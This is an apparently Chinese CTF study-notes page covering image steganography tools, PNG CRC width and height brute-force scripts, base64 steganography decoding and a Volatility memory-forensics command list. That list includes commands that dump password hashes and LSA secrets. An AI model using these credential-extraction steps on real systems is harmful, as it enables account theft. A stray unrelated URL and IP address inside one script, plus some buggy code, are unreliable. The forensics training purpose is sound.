<h4 id="F5隐写"><a href="#F5隐写" class="headerlink" title="F5隐写"></a>F5隐写</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java Extract “待提取的图片路径” -p 密码</span><br></pre></td></tr></table></figure>



<h4 id="outguess隐写"><a href="#outguess隐写" class="headerlink" title="outguess隐写"></a>outguess隐写</h4><p>输入outguess -help即可获得相关命令。<br>加密：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k “my secret key” -d hidden.txt demo.jpg out.jpg</span><br></pre></td></tr></table></figure>

<p>加密之后，demo.jpg会覆盖out.jpg，hidden.txt的内容是要隐藏的东西。<br>解密：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k “my secret key” -r out.jpg hidden.txt</span><br></pre></td></tr></table></figure>

<p>解密之后，紧密内容放在hidden.txt中</p>
<h4 id="栅栏里的大帝"><a href="#栅栏里的大帝" class="headerlink" title="栅栏里的大帝"></a>栅栏里的大帝</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">string,number</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+(<span class="built_in">ord</span>(i)-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)-space2)%<span class="number">26</span>),end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;A&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)+(<span class="built_in">ord</span>(i)-<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)-space2)%<span class="number">26</span>),end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(i,end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decipherin</span>(<span class="params">string,space1,space2</span>):</span><br><span class="line">    str1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> space1 &gt;= <span class="built_in">len</span>(string):</span><br><span class="line">        decode(string,space2)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(string)%space1 == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(string)//space1):</span><br><span class="line">            str1 += string[i:<span class="built_in">len</span>(string)+<span class="number">1</span>:<span class="built_in">len</span>(string)//space1]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(string)//space1+<span class="number">1</span>):</span><br><span class="line">            str1 += string[i:<span class="built_in">len</span>(string)+<span class="number">1</span>:<span class="built_in">len</span>(string)//space1+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    decode(str1,space2)</span><br><span class="line"></span><br><span class="line">text = <span class="built_in">input</span>(<span class="string">&#x27;请输入密文&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> space1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">for</span> space <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        space2 = space%<span class="number">26</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27; &#x27;</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;密文有误&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            decipherin(text,space1,space2)</span><br></pre></td></tr></table></figure>

<p>flag{th1s_1s_f149}</p>
<h4 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;e:\Desktop\python\丁真和他的小马.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()        </span><br><span class="line">crc32frombp = <span class="built_in">int</span>(crcbp[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)     </span><br><span class="line"><span class="built_in">print</span>(crc32frombp)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):                       </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):                   </span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="built_in">print</span>(crc32)</span><br><span class="line">        <span class="keyword">if</span>(crc32 == crc32frombp):           </span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>修复图片后LSB隐写查看可以zhi_shi_xue_bao,包上flag{}，提交</p>
<h4 id="png宽高爆破"><a href="#png宽高爆破" class="headerlink" title="png宽高爆破"></a>png宽高爆破</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#判断谁被修改了</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"> </span><br><span class="line">image_data=<span class="built_in">open</span>(<span class="string">&#x27;图片路径&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">bin_data=image_data.read()</span><br><span class="line">crc32key = zlib.crc32(bin_data[<span class="number">12</span>:<span class="number">29</span>])                 <span class="comment">#使用函数计算</span></span><br><span class="line"><span class="keyword">if</span> crc32key==<span class="built_in">int</span>(bin_data[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(), <span class="number">16</span>):<span class="comment">#对比算出的CRC和原本的CRC</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;宽高没有问题&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;宽高被改了&#x27;</span>)</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#爆破高，需要自查查图片信息。Python2运行</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">crc32key = <span class="number">0xFF800203</span>    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">65535</span>):</span><br><span class="line">  height = struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)</span><br><span class="line">  data = <span class="string">&#x27;\x49\x48\x44\x52\x00\x00\x00\x64&#x27;</span> + height + <span class="string">&#x27;\x08\x02\x00\x00\x00&#x27;</span></span><br><span class="line">  crc32result = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">  <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> c: <span class="string">&quot;%02X&quot;</span> % <span class="built_in">ord</span>(c), height))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#只需要填写图片路径，爆破宽和高，有点费电脑</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;E:\Desktop\cd83c00e-130c-47ba-b4d8-c0c0b8d8de31.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()    </span><br><span class="line">crc32frombp = <span class="built_in">int</span>(crcbp[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)     </span><br><span class="line"><span class="built_in">print</span>(crc32frombp)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):                       </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):                   </span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="built_in">print</span>(crc32)</span><br><span class="line">        <span class="keyword">if</span>(crc32 == crc32frombp):           </span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#单爆破宽度，只需输入图片地址</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span>  binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;d21007e64ba84021875c3556ece71173.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="comment">#12-15字节代表固定的文件头数据块的标示，16-19字节代表宽度，20-23字节代表高度，24-28字节分别代表</span></span><br><span class="line"><span class="comment"># Bit depth、ColorType、Compression method、Filter method、Interlace method</span></span><br><span class="line"><span class="comment">#29-32字节为CRC校验和</span></span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):<span class="comment">#宽度0-9999搜索</span></span><br><span class="line">    data=fi[<span class="number">12</span>:<span class="number">16</span>]+struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>,i)+fi[<span class="number">20</span>:<span class="number">29</span>]  <span class="comment">#pack函数将int转为bytes,&gt;表示大端00 00 00 02,I表示4字节无符号int;&lt;表示小端 02 00 00 00</span></span><br><span class="line">    crc=binascii.crc32(data)&amp;<span class="number">0xffffffff</span> <span class="comment">#byte的大小为8bits而int的大小为32bits,转换时进行与运算避免补码问题0x932f8a6b</span></span><br><span class="line">    <span class="keyword">if</span> crc==struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>,fi[<span class="number">29</span>:<span class="number">33</span>])[<span class="number">0</span>]&amp;<span class="number">0xffffffff</span> : <span class="comment">#解开为无符号整数</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>



<h4 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">d=<span class="built_in">open</span>(<span class="string">&quot;文件路径&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">e=d.splitlines()</span><br><span class="line">binstr=<span class="string">&quot;&quot;</span></span><br><span class="line">base64=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> e :</span><br><span class="line">    <span class="keyword">if</span> i.find(<span class="string">&quot;==&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">        temp=<span class="built_in">bin</span>((base64.find(i[-<span class="number">3</span>])&amp;<span class="number">15</span>))[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment">#取倒数第3个字符，在base64找到对应的索引数（就是编码数），取低4位，再转换为二进制字符</span></span><br><span class="line">        binstr=binstr + <span class="string">&quot;0&quot;</span>*(<span class="number">4</span>-<span class="built_in">len</span>(temp))+temp <span class="comment">#二进制字符补高位0后，连接字符到binstr</span></span><br><span class="line">    <span class="keyword">elif</span> i.find(<span class="string">&quot;=&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">        temp=<span class="built_in">bin</span>((base64.find(i[-<span class="number">2</span>])&amp;<span class="number">3</span>))[<span class="number">2</span>:] <span class="comment">#取倒数第2个字符，在base64找到对应的索引数（就是编码数），取低2位，再转换为二进制字符</span></span><br><span class="line">        binstr=binstr + <span class="string">&quot;0&quot;</span>*(<span class="number">2</span>-<span class="built_in">len</span>(temp))+temp <span class="comment">#二进制字符补高位0后，连接字符到binstr</span></span><br><span class="line"><span class="built_in">str</span>=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(binstr),<span class="number">8</span>):</span><br><span class="line">    <span class="built_in">str</span>=<span class="built_in">str</span>+<span class="built_in">chr</span>(<span class="built_in">int</span>(binstr[i:i+<span class="number">8</span>],<span class="number">2</span>)) <span class="comment">#从左到右，每取8位转换为ascii字符，连接字符到字符串</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>) <span class="comment">#结果是 Base_sixty_four_point_five转换为</span></span><br></pre></td></tr></table></figure>

<h4 id="stegdetect"><a href="#stegdetect" class="headerlink" title="stegdetect"></a>stegdetect</h4><p>stegdetect 就是用来检测jpg类型的图片是否隐藏着其他文件或内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">q – 仅显示可能包含隐藏内容的图像</span><br><span class="line"></span><br><span class="line">n – 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。</span><br><span class="line"></span><br><span class="line">s – 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</span><br><span class="line"></span><br><span class="line">d – 打印带行号的调试信息。</span><br><span class="line"></span><br><span class="line">t – 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：</span><br><span class="line"></span><br><span class="line">j – 检测图像中的信息是否是用jsteg嵌入的。</span><br><span class="line"></span><br><span class="line">o – 检测图像中的信息是否是用outguess嵌入的。</span><br><span class="line"></span><br><span class="line">p – 检测图像中的信息是否是用jphide嵌入的。</span><br><span class="line"></span><br><span class="line">i – 检测图像中的信息是否是用invisible secrets嵌入的。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="梅花香自苦寒来-坐标画二维码"><a href="#梅花香自苦寒来-坐标画二维码" class="headerlink" title="梅花香自苦寒来(坐标画二维码)"></a>梅花香自苦寒来(坐标画二维码)</h4><p>提示图穷匕现，010打开，拉到最下方不是FF D9 ,搜FFD9 后面跟着一大串好像16进制的文本，进行16进制转字符串，得到很多坐标，用gnuplot，来绘制坐标得到二维码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#十六进制转文本</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;E:\Desktop\data.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> h:     <span class="comment"># hex.txt为要转换的文本文件</span></span><br><span class="line">    val = h.read()</span><br><span class="line">    h.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> re: <span class="comment"># 转换完成后写入result.txt</span></span><br><span class="line">    tem = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(val), <span class="number">2</span>):</span><br><span class="line">        tem = <span class="string">&#x27;0x&#x27;</span> + val[i] + val[i+<span class="number">1</span>]</span><br><span class="line">        tem = <span class="built_in">int</span>(tem, base=<span class="number">16</span>)</span><br><span class="line">        re.write(<span class="built_in">chr</span>(tem))</span><br><span class="line">    re.close()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#转换成gnuplotTXt能看懂的格式</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> res:  <span class="comment"># 坐标格式文件比如(7,7)</span></span><br><span class="line">    re = res.read()</span><br><span class="line">    res.close()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;gnuplotTxt.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> gnup:   <span class="comment"># 将转换后的坐标写入gnuplotTxt.txt</span></span><br><span class="line">    re = re.split()</span><br><span class="line">    tem = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(re)):</span><br><span class="line">        tem = re[i]</span><br><span class="line">        tem = tem.lstrip(<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">        tem = tem.rstrip(<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(tem)):</span><br><span class="line">            <span class="keyword">if</span> tem[j] == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">                tem = tem[:j] + <span class="string">&#x27; &#x27;</span> + tem[j+<span class="number">1</span>:]</span><br><span class="line">        gnup.write(tem + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    gnup.close()</span><br><span class="line">    </span><br><span class="line">    http://wenming.xinye.gov.cn/robots.txt</span><br><span class="line">        </span><br><span class="line">        <span class="number">218.28</span><span class="number">.78</span><span class="number">.118</span></span><br></pre></td></tr></table></figure>

<h4 id="excel破解"><a href="#excel破解" class="headerlink" title="excel破解"></a>excel破解</h4><p>下载xls文件有密码，改成rar,用010打开搜flag，直接用010打开xls文件会有乱码，但也能找到flag，一般ofiice文件都可以尝试把文件改成压缩包查看，同时有的压缩包文件可能是office文件转换的。</p>
<p> CTF{office_easy_cracked}</p>
<h4 id="取证volatility"><a href="#取证volatility" class="headerlink" title="取证volatility"></a>取证volatility</h4><h5 id="volatility参数"><a href="#volatility参数" class="headerlink" title="volatility参数"></a>volatility参数</h5><p>volatility -f 文件名 imageinfo  		     	 得到镜像的基本信息。<br>volatility -f 文件名 –profile&#x3D;系统 pslist		查看进程信息<br>volatility -f 文件名 –profile&#x3D;系统 pstree	    查看进程树<br>volatility -f 文件名 –profile&#x3D;系统 hashdump		查看用户名密码信息<br>volatility -f 文件名 –profile&#x3D;系统 john			爆破密码<br>volatility -f 文件名 –profile&#x3D;系统 lsadump		查看用户强密码<br>volatility -f 文件名 –profile&#x3D;系统 svcscan		查看服务<br>volatility -f 文件名 –profile&#x3D;系统 iehistory	查看IE浏览器历史记录<br>volatility -f 文件名 –profile&#x3D;系统 netscan		查看网络连接<br>volatility -f 文件名 –profile&#x3D;系统 cmdscan		cmd历史命令<br>volatility -f 文件名 –profile&#x3D;系统 consoles		命令历史记录<br>volatility -f 文件名 –profile&#x3D;系统 cmdline		查看cmd输出， 获取命令行下运行的程序<br>volatility -f 文件名 –profile&#x3D;系统 envars 		查看环境变量，一般很多配合grep筛选，可也是使用-p指定pid<br>volatility -f 文件名 –profile&#x3D;系统 filescan		查看文件<br>volatility -f 文件名 –profile&#x3D;系统 notepad		查看当前展示的notepad内容<br>volatility -f 文件名 –profile&#x3D;系统 hivelist		查看注册表配置单元<br>volatility -f 文件名 –profile&#x3D;系统 userassist	查看运行程序相关的记录，比如最后一次更新时间，运行过的次数等。<br>volatility -f 文件名 –profile&#x3D;系统 clipboard  	查看剪贴板的信息<br>volatility -f 文件名 –profile&#x3D;系统 timeliner	最大程序提取信息<br>volatility -f 文件名 –profile&#x3D;系统 Dumpregistry	提取日志文件<br>volatility -f 文件名 –profile&#x3D;系统 dlllist		进程相关的dll文件列表<br>volatility -f 文件名 –profile&#x3D;系统 memdump -p xxx –dump-dir&#x3D;.&#x2F; 	提取进程<br>volatility -f 文件名 –profile&#x3D;系统 dumpfiles -Q 0xxxxxxxx -D .&#x2F; 	提取文件<br>volatility -f 文件名 –profile&#x3D;系统 procdump -p pid -D .&#x2F;			转存可执行程序<br>volatility -f 文件名 –profile&#x3D;系统 screenshot –dump-dir&#x3D;.&#x2F;			屏幕截图<br>volatility -f 文件名 –profile&#x3D;系统 hivedump -o 0xfffff8a001032410 查看注册表键名<br>volatility -f 文件名 –profile&#x3D;系统 printkey -K “xxxxxxx”			查看注册表键值<br>volatility -f &#x2F;root&#x2F;hacker.raw –profile&#x3D;Win7SP1x64 filescan |grep Desktop    查看桌面文件</p>
<p>amcache    	查看AmCache应用程序痕迹信息<br>apihooks    检测内核及进程的内存空间中的API hook<br>atoms     	列出会话及窗口站atom表<br>atomscan    Atom表的池扫描(Pool scanner)<br>auditpol    列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息<br>bigpools    使用BigPagePoolScanner转储大分页池(big page pools)<br>bioskbd    	从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出BIOS开机密码)<br>cachedump   	获取内存中缓存的域帐号的密码哈希<br>callbacks   	打印全系统通知例程<br>clipboard   	提取Windows剪贴板中的内容<br>cmdline    	显示进程命令行参数<br>cmdscan    	提取执行的命令行历史记录（扫描_COMMAND_HISTORY信息）<br>connections  	打印系统打开的网络连接(仅支持Windows XP 和2003)<br>connscan    打印TCP连接信息<br>consoles    提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION信息）<br>crashinfo   	提取崩溃转储信息<br>deskscan    tagDESKTOP池扫描(Poolscaner)<br>devicetree   显示设备树信息<br>dlldump    	从进程地址空间转储动态链接库<br>dlllist    	打印每个进程加载的动态链接库列表<br>driverirp   	IRP hook驱动检测<br>drivermodule  关联驱动对象至内核模块<br>driverscan   驱动对象池扫描<br>dumpcerts   	提取RAS私钥及SSL公钥<br>dumpfiles   	提取内存中映射或缓存的文件<br>dumpregistry  转储内存中注册表信息至磁盘<br>editbox    	查看Edit编辑控件信息 (Listbox正在实验中)<br>envars     显示进程的环境变量<br>eventhooks   打印Windows事件hook详细信息<br>evtlogs    	提取Windows事件日志（仅支持XP&#x2F;2003)<br>filescan    提取文件对象（file objects）池信息<br>gahti     	转储用户句柄（handle）类型信息<br>gditimers   	打印已安装的GDI计时器(timers)及回调(callbacks)<br>gdt      	显示全局描述符表(Global Deor Table)<br>getservicesids 获取注册表中的服务名称并返回SID信息<br>getsids    	打印每个进程的SID信息<br>handles    	打印每个进程打开的句柄的列表<br>hashdump    转储内存中的Windows帐户密码哈希(LM&#x2F;NTLM)<br>hibinfo    	转储休眠文件信息<br>hivedump    打印注册表配置单元信息<br>hivelist    打印注册表配置单元列表<br>hivescan    注册表配置单元池扫描<br>hpakextract  	从HPAK文件（Fast Dump格式）提取物理内存数据<br>hpakinfo    查看HPAK文件属性及相关信息<br>idt      	显示中断描述符表(Interrupt Deor Table)<br>iehistory   	重建IE缓存及访问历史记录<br>imagecopy   	将物理地址空间导出原生DD镜像文件<br>imageinfo   	查看&#x2F;识别镜像信息<br>impscan    	扫描对导入函数的调用<br>joblinks    打印进程任务链接信息<br>kdbgscan    搜索和转储潜在KDBG值<br>kpcrscan    搜索和转储潜在KPCR值<br>ldrmodules   检测未链接的动态链接DLL<br>lsadump    	从注册表中提取LSA密钥信息（已解密）<br>machoinfo   	转储Mach-O 文件格式信息<br>malfind    	查找隐藏的和插入的代码<br>mbrparser   	扫描并解析潜在的主引导记录(MBR)<br>memdump    	转储进程的可寻址内存<br>memmap     打印内存映射<br>messagehooks  桌面和窗口消息钩子的线程列表<br>mftparser   	扫描并解析潜在的MFT条目<br>moddump    	转储内核驱动程序到可执行文件的示例<br>modscan    	内核模块池扫描<br>modules    	打印加载模块的列表<br>multiscan   	批量扫描各种对象<br>mutantscan   对互斥对象池扫描<br>notepad    	查看记事本当前显示的文本<br>objtypescan  	扫描窗口对象类型对象<br>patcher    	基于页面扫描的补丁程序内存<br>poolpeek    可配置的池扫描器插件<br>printkey    打印注册表项及其子项和值<br>privs     	显示进程权限<br>procdump    进程转储到一个可执行文件示例<br>pslist     按照EPROCESS列表打印所有正在运行的进程<br>psscan     进程对象池扫描<br>pstree     以树型方式打印进程列表<br>psxview    	